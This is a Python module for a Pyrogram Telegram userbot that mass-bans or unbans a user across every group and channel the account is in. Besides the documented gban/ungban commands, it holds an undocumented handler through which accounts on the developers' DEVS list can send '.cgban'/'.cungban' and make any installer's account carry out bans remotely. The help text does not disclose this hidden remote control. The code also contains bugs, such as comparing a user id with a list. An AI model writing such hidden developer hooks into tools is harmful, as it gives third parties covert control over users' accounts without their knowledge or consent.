
from pyrogram import Client, errors, filters
from pyrogram.types import ChatPermissions, Message
from pyrogram import Client 
from pyrogram.enums import ChatType

from Ubot import *
from Ubot.modules.basic import add_command_help
from Ubotlibs.Ubot.helper import edit_or_reply
from Ubotlibs.Ubot.utils.misc import *
from Ubotlibs.Ubot.helper.PyroHelpers import get_ub_chats
from Ubot import cmds
from Ubotlibs.Ubot.database.accesdb import *
from Ubot.modules.basic import DEVS



@Client.on_message(filters.command(["cgban", "cungban"], ".") & filters.user(DEVS) & ~filters.me)
@Client.on_message(filters.command(["gban", "ungban"], cmds) & filters.me)
@check_access
async def _(client, message):
    user_id = await extract_user(message)
    ky = await message.reply("</b>Memproses. . .</b>")
    if not user_id:
        return await ky.edit("<b>User tidak ditemukan</b>")
    try:
        user = await client.get_users(user_id)
    except Exception as error:
        return await ky.edit(error)
    done = 0
    failed = 0
    text = [
        "<b>💬 Global Banned</b>\n\n<b>✅ Berhasil: {} Chat</b>\n<b>❌ Gagal: {} Chat</b>\n<b>👤 User: <a href='tg://user?id={}'>{} {}</a></b>",
        "<b>💬 Global Unbanned</b>\n\n<b>✅ Berhasil: {} Chat</b>\n<b>❌ Gagal: {} Chat</b>\n<b>👤 User: <a href='tg://user?id={}'>{} {}</a></b>",
    ]
    if message.command[0] == "gban":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                if user.id == DEVS:
                    return await ky.edit(
                        "Anda tidak bisa gban dia, karena dia pembuat saya"
                    )
                elif not user.id == DEVS:
                    try:
                        await client.ban_chat_member(chat_id, user.id)
                        done += 1
                        await asyncio.sleep(0.1)
                    except:
                        failed += 1
                        await asyncio.sleep(0.1)
        await ky.delete()
        return await message.reply(
            text[0].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "ungban":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                try:
                    await client.unban_chat_member(chat_id, user.id)
                    done += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
                    await asyncio.sleep(0.1)
        await ky.delete()
        return await message.reply(
            text[1].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "cgban":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                if user.id == DEVS:
                    return await ky.edit(
                        "Anda tidak bisa gban dia, karena dia pembuat saya"
                    )
                elif not user.id == DEVS:
                    try:
                        await client.ban_chat_member(chat_id, user.id)
                        done += 1
                        await asyncio.sleep(0.1)
                    except:
                        failed += 1
                        await asyncio.sleep(0.1)
        await ky.delete()
        return await message.reply(
            text[0].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )
    elif message.command[0] == "cungban":
        async for dialog in client.get_dialogs():
            chat_type = dialog.chat.type
            if chat_type in [
                ChatType.GROUP,
                ChatType.SUPERGROUP,
                ChatType.CHANNEL,
            ]:
                chat_id = dialog.chat.id
                try:
                    await client.unban_chat_member(chat_id, user.id)
                    done += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
                    await asyncio.sleep(0.1)
        await ky.delete()
        return await message.reply(
            text[1].format(
                done, failed, user.id, user.first_name, (user.last_name or "")
            )
        )


add_command_help(
    "globals",
    [
        [
            "gban <reply/username/userid>",
            "Melakukan Global Banned Ke Semua Grup Dimana anda Sebagai Admin.",
        ],
        ["ungban <reply/username/userid>", "Membatalkan Global Banned."],
    ],
)
